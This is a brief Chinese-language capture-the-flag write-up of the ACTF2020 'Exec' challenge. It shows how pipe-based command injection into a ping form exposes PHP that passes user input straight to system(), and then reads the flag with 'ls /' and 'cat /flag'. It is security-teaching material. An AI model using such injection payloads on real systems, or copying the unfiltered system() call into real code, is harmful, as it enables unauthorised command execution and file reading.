# [ACTF2020 新生赛]Exec

网页上可以输入一个IP进行PING操作并返回数据，应该是一道命令执行的题

尝试使用管道符执行多条命令

`target=127.0.0.1|cat index.php`
```php
<?php
if (isset($_POST['target'])) {
    system("ping -c 3 ".$_POST['target']);
}
?>
```

看来题目没有任何的过滤，直接查找flag，get flag
```html
target=127.0.0.1 | ls /
target=127.0.0.1 | cat /flag
```
